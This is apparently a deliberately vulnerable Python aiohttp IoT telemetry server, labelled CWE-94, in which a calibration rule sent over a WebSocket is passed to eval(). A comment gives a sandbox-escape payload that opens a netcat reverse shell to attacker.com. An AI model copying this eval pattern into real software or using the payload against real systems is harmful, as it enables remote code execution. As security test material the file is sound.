import os
import json
import asyncio
import sqlite3
import logging
from aiohttp import web
from datetime import datetime

# Configure logging for the IoT Edge Telemetry Hub
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - IoTHub - %(levelname)s - %(message)s'
)
logger = logging.getLogger("AioHttpIoT")

DB_FILE = "iot_telemetry.db"

def init_telemetry_db():
    """Initializes the SQLite database for storing sensor telemetry."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE telemetry (
            record_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            sensor_id TEXT NOT NULL,
            raw_value REAL NOT NULL,
            calibrated_value REAL NOT NULL
        )
    ''')

    conn.commit()
    conn.close()
    logger.info("IoT telemetry database initialized.")

def store_telemetry(sensor_id: str, raw: float, calibrated: float):
    """Persists a telemetry reading to the local database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO telemetry (sensor_id, raw_value, calibrated_value) VALUES (?, ?, ?)",
            (sensor_id, raw, calibrated)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error storing telemetry for {sensor_id}: {e}")

def apply_calibration(raw_value: float, calibration_rule: str) -> float:
    """
    VULNERABLE FUNCTION: CWE-94 Improper Control of Generation of Code ('Code Injection')
    Trigger Path: aiohttp WebSocket JSON payload -> 'calibration_rule' evaluated via eval()
    """
    logger.debug(f"Applying calibration rule: {calibration_rule} to raw value: {raw_value}")
    
    try:
        # Vulnerability: The IoT telemetry hub allows edge devices to send dynamic 
        # mathematical rules (e.g., "val * 1.05 + 0.2") over WebSockets to adjust 
        # for sensor drift on the fly. The server uses eval() to process these rules.
        # Even though __builtins__ is restricted, an attacker can use Python's MRO 
        # (Method Resolution Order) and object introspection to bypass the sandbox 
        # and execute arbitrary code on the server hosting the IoT Hub.
        
        allowed_vars = {"val": float(raw_value)}
        
        # CWE-94 occurs instantly when the untrusted calibration_rule is evaluated.
        result = eval(calibration_rule, {"__builtins__": {}}, allowed_vars)
        
        return float(result)
        
    except Exception as e:
        logger.error(f"Calibration failed, falling back to raw value. Error: {e}")
        return float(raw_value)

async def websocket_handler(request):
    """Handles persistent WebSocket connections from edge devices."""
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    
    peer_ip = request.remote
    logger.info(f"New IoT edge device connected via WebSocket from {peer_ip}.")

    async for msg in ws:
        if msg.type == web.WSMsgType.TEXT:
            try:
                payload = json.loads(msg.data)
                sensor_id = payload.get("sensor_id", "unknown")
                raw_val = payload.get("value")
                rule = payload.get("calibration_rule")

                if raw_val is None or not rule:
                    await ws.send_json({"error": "Missing 'value' or 'calibration_rule' in payload"})
                    continue

                # Pass the untrusted string directly to the vulnerable function
                calibrated_val = apply_calibration(raw_val, rule)
                
                store_telemetry(sensor_id, raw_val, calibrated_val)

                await ws.send_json({
                    "status": "recorded",
                    "sensor_id": sensor_id,
                    "calibrated_value": calibrated_val
                })
                
            except json.JSONDecodeError:
                await ws.send_json({"error": "Payload must be valid JSON"})
                
        elif msg.type == web.WSMsgType.ERROR:
            logger.error(f"WebSocket connection closed with exception {ws.exception()}")

    logger.info(f"IoT edge device {peer_ip} disconnected.")
    return ws

async def init_app():
    """Application factory for aiohttp."""
    init_telemetry_db()
    app = web.Application()
    app.router.add_get('/ws/telemetry', websocket_handler)
    return app

if __name__ == '__main__':
    # Example Malicious Trigger:
    # 1. Attacker connects a WebSocket client to ws://127.0.0.1:8081/ws/telemetry
    # 2. Attacker sends a JSON payload with a sandbox-escaping Python payload in the rule:
    #
    # {
    #   "sensor_id": "temp_probe_01",
    #   "value": 22.5,
    #   "calibration_rule": "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')"
    # }
    
    logger.info("Starting aiohttp IoT Edge Telemetry Hub on http://0.0.0.0:8081")
    web.run_app(init_app(), host='0.0.0.0', port=8081, access_log=None)
